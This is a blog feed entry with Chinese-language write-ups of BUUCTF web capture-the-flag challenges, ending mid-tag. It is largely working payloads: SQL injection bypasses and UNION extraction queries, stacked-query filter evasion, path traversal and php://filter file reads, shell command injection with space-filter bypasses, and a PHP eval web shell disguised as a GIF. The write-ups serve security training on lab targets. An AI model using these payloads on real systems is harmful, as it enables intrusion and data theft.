<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>D3n13d &#39;s blog</title>
  
  
  <link href="https://d3n13d.github.io/atom.xml" rel="self"/>
  
  <link href="https://d3n13d.github.io/"/>
  <updated>2022-01-12T08:43:49.449Z</updated>
  <id>https://d3n13d.github.io/</id>
  
  <author>
    <name>D3n13d</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF_web_第一页wp分享</title>
    <link href="https://d3n13d.github.io/2022/01/12/BUUCTF-web-%E7%AC%AC%E4%B8%80%E9%A1%B5wp%E5%88%86%E4%BA%AB/"/>
    <id>https://d3n13d.github.io/2022/01/12/BUUCTF-web-%E7%AC%AC%E4%B8%80%E9%A1%B5wp%E5%88%86%E4%BA%AB/</id>
    <published>2022-01-12T08:42:42.000Z</published>
    <updated>2022-01-12T08:43:49.449Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码直接出</p><figure class="highlight ada"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>重点：include 对 ‘/‘的处理</p><p>根据注释拿到php源码,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>) //安全函数 检查是否在白名单里</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !is_string(<span class="hljs-variable">$page</span>)) &#123; <span class="hljs-comment">//page参数str类型</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = mb_substr(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br><span class="hljs-comment">//            demo:$page=&#x27;http://www.baidu.com/123/456/../../../../?source.php&amp;b=1&#x27;</span><br>            <span class="hljs-comment">//结果&quot;http://www.baidu.com/123/456/../../../../&quot;</span><br>            <span class="hljs-comment">//可以看到实际上完成了去除传参的工作 下面同理</span><br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>); <span class="hljs-comment">//一次url解码</span><br>            <span class="hljs-variable">$_page</span> = mb_substr(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现存在hint.php</p><p>提示我们 flag在 /ffffllllaaaagggg </p><p>那么我们不难发现 如果想要文件包含 必须要一次url解密 三次白名单验证 两次取路径（就是不管后面参数）</p><p>哎？那这个时候我们多打几个问号能不能绕过呢？ 答案是不行的，因为strpos取的是问号第一次出现的位置</p><p>所以其实多处理那几次区别不大 我们肯定是希望会在最后返回 true 然后 文件包含 $file</p><p>这种时候其实可以试试路径穿越，返回true即可</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201072224540.png" alt="image-20220107222434456"></p><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=hint.php?<br></code></pre></td></tr></table></figure><p>这样就可以过这个判断</p><p>结合路径穿越，构造</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=hint.php?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg <br></code></pre></td></tr></table></figure><p>为什么这样写？对于include 如果后面的内容带 ‘/‘ 会被识别为目录 那么最后会包含最后的内容 ../作为目录穿越</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看源码得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cat</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cat</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$cat</span>==<span class="hljs-string">&#x27;dog&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>显然flag不是Syc{cat_cat_cat_cat} 但是告诉你获取flag方式了</p><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?cat=dog<br></code></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>就是骗了一下吧</p><p>其实就是大概这样的写法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find out the flag?&quot;</span>;<br><span class="hljs-comment">//flag&#123;5a15074c-0bd0-473e-bf9d-516544448c9a&#125;</span><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf8&quot;</span>&gt;<br>Can you find out the flag?<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>常规下php代码不可视，所以用伪协议读取即可</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span><span class="hljs-keyword">read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>经典老题</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201072253903.png" alt="image-20220107225301830"></p><p>利用堆叠注入获取所有表</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201072253353.png" alt="image-20220107225349306"></p><p>发现 1919810931114514 这个表里有 flag字段</p><p>之后发现过滤了select 等字段 那其实合成一下就行</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?inject=<span class="hljs-number">1&#x27;</span>;<span class="hljs-function">PREPARE hacker <span class="hljs-keyword">from</span> <span class="hljs-title">concat</span>(<span class="hljs-params"><span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;elect&#x27;</span>, <span class="hljs-string">&#x27; * from `1919810931114514` &#x27;</span></span>)</span>;EXECUTE hacker;<span class="hljs-meta">#</span><br><span class="hljs-function">PREPARE hacker <span class="hljs-keyword">from</span> <span class="hljs-title">concat</span>(<span class="hljs-params"><span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;esc&#x27;</span>,<span class="hljs-string">&#x27;Flag&#x27;</span></span>)</span>;EXECUTE hacker;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201080015265.png" alt="image-20220108001548214"></p><p>经过测试发现可以 堆叠注入 <code>1;show databases;#</code></p><p>有表</p><blockquote><p>ctftraining</p><p>ctf</p><p>information_schema</p><p>mysql</p><p>performance_schema</p><p>test</p></blockquote><p>剩下的就不会了</p><p>非预期  *,1</p><p>预期解 </p><p>1;set sql_mode=PIPES_AS_CONCAT;select 1</p><div class="code-wrapper"><pre><code class="hljs">在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能。这里可以理解为 sql 在遇到 1||(0/1) 时 只运行前一个 所以无法查询第二个操作数</code></pre></div><p>mysql逻辑运算 <a href="https://www.runoob.com/mysql/mysql-operator.html">https://www.runoob.com/mysql/mysql-operator.html</a></p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>太基础了 不想写 127.0.0.1 | cat /flag</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201080022247.png" alt="image-20220108002235193"></p><h2 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="[极客大挑战 2019]Secret"></a>[极客大挑战 2019]Secret</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081540389.png" alt="image-20220108154009276"></p><p>一开始以为是http跳转 然后发现这个地方有个a 标签跳转到 ./Archive_room.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081542857.png" alt="image-20220108154203809"></p><p>之后又发现了secret.php</p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||stristr(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flag放在了flag.php里</span><br><span class="hljs-meta">?&gt;</span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>尝试直接包含flag.php但是文件内容不可见 那么就可以用php为协议读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">?file=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>直接万能密码 1’ or 1=1# 得到admin密码a6459693046ee8280c4a2b5a9625bc45 正好32位我尝试 8-4-4-4-12直接交flag但实际不是</p><p>之后发现我们可以继续注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">check.php?username=admin1&#x27; union select 1,version(),database()%23&amp;password=a6459693046ee8280c4a2b5a9625bc45<br></code></pre></td></tr></table></figure><p>版本：10.3.18-MariaDB</p><p>数据库：geek</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">check.php?username=admin1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;geek&#x27;%23&amp;password=a6459693046ee8280c4a2b5a9625bc45<br></code></pre></td></tr></table></figure><p>geekuser,l0ve1ysq1</p><p>数据库geek 俩表 geekuser,l0ve1ysq1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> from information_schema.columns where table_name=&#x27;l<span class="hljs-number">0</span>ve<span class="hljs-number">1</span>ysq<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">23</span>&amp;password=a<span class="hljs-number">6459693046</span>ee<span class="hljs-number">8280</span>c<span class="hljs-number">4</span>a<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a<span class="hljs-number">9625</span>bc<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><p>三个字段id,username,password</p><p>最终payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(id,username,password),<span class="hljs-number">3</span> from l<span class="hljs-number">0</span>ve<span class="hljs-number">1</span>ysq<span class="hljs-number">1</span>%<span class="hljs-number">23</span>&amp;password=a<span class="hljs-number">6459693046</span>ee<span class="hljs-number">8280</span>c<span class="hljs-number">4</span>a<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a<span class="hljs-number">9625</span>bc<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>直接构造，三者都行</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">ip=127.0.0.1|echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-<span class="hljs-keyword">d</span>|<span class="hljs-keyword">sh</span><br>?ip=127.0.0.1;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>`<span class="hljs-keyword">ls</span>`<br>?ip=127.0.0.1;a=<span class="hljs-keyword">g</span>;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>蚁剑直接连</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082158823.png" alt="image-20220108215810763"></p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>无法直接访问网页</p><p>这里选择了 curl</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082205781.png" alt="image-20220108220545599"></p><p>发现了 Secret.php</p><p>构建数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Secret.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node4.buuoj.cn:26189<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Syclover<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6<br>Referer:https://Sycsecret.buuoj.cn<br>X-Forwarded-For:127.0.0.1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>构建马子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082219255.png" alt="image-20220108221915179"></p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>和上面一题一样，不赘述</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082222743.png" alt="image-20220108222232683"></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>整挺好</p><p>考点：无参数RCE，php特性</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091610973.png" alt="image-20220109161023880"></p><p>首先是这个页面以为可以直接执行命令但是实际上并没有，然后看源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;<br>  &lt;title&gt;简单的计算器&lt;/title&gt;<br>  <br>  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;<br>  &lt;link rel=&quot;stylesheet&quot; href=&quot;./libs/bootstrap.min.css&quot;&gt;<br>  &lt;script src=&quot;./libs/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;<br>  &lt;script src=&quot;./libs/bootstrap.min.js&quot;&gt;&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;div class=&quot;container text-center&quot; style=&quot;margin-top:30px;&quot;&gt;<br>  &lt;h2&gt;表达式&lt;/h2&gt;<br>  &lt;form id=&quot;calc&quot;&gt;<br>    &lt;div class=&quot;form-group&quot;&gt;<br>      &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;content&quot; placeholder=&quot;输入计算式&quot; data-com.agilebits.onepassword.user-edited=&quot;yes&quot;&gt;<br>    &lt;/div&gt;<br>    &lt;div id=&quot;result&quot;&gt;&lt;div class=&quot;alert alert-success&quot;&gt;<br>            &lt;/div&gt;&lt;/div&gt;<br>    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;计算&lt;/button&gt;<br>  &lt;/form&gt;<br>&lt;/div&gt;<br>&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;<br>&lt;script&gt;<br>    $(&#x27;#calc&#x27;).submit(function()&#123;<br>        $.ajax(&#123;<br>            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),<br>            type:&#x27;GET&#x27;,<br>            success:function(data)&#123;<br>                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;<br>            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;<br>            &lt;/div&gt;`);<br>            &#125;,<br>            error:function()&#123;<br>                alert(&quot;这啥?算不来!&quot;);<br>            &#125;<br>        &#125;)<br>        return false;<br>    &#125;)<br>&lt;/script&gt;<br><br>&lt;/body&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>发现了calc.php这个页面 这个地方也是用ajax和calc页面进行数据传输，前往calc.php 获得代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到如果我们传入<code>num</code>的话，根本就不会执行我们希望执行的eval函数，这个时候可以利用PHP解析的特性</p><p>构造<code>? num=phpinfo()</code>这时，就会绕过WAF和isset的判断。这样实际上 服务器自己接收的是 <code> num</code> 而自己处理的数据是 <code>num</code> 这里有一个空格的区别</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091634769.png" 